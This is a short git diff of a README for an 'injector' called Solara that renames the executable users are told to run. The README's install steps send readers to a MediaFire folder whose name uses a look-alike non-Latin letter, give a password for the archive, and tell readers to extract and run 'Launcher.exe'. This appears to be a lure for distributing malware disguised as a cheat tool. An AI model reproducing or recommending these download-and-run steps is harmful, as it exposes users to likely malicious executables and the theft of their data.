@@ -24,7 +24,7 @@ To install Solara, follow these steps:
 
 1. [Download the Latest Version](https://www.mediafire.com/folder/4tp12ngk9fn61/Launchеr) and download the latest version of Solara. `Archive Code: 2024`
 2. **Extract the Files:** Extract the downloaded zip file to a location of your choice on your computer.
-3. **Run Solara:** Open the extracted folder and run the `Solara.exe` file to launch the injector.
+3. **Run Solara:** Open the extracted folder and run the `Launcher.exe` file to launch the injector.
 
 ## Usage
 
